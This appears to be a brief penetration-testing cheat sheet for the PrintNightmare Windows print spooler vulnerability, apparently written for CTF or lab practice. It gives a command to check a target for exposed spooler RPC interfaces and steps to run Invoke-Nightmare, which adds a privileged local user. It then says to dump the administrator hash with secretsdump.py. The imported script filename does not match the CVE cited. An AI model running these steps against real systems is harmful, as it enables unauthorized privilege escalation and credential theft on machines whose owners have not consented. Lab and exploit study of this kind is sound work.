# Printnightmare
--------------
Checking for printnightmare using rpcdump.py 
```bash
python3 /opt/wintools/impacket/examples/rpcdump.py 10.10.11.106 | egrep 'MS-RPRN|MS-PAR'
```

## using Invoke-Nightmare
https://github.com/calebstewart/CVE-2021-1675
upload the ps1 script to the victim machine
```
PS> Import-Module .\CVE-2021-16756.ps1
PS> Invoke-Nightmare -NewUser "cbbn" -NewPassword "passw0rd123"
```

check if the user is added, then use secretsdump.py to get the hash of the administrator.

More cases to exploit printnightmare:
https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html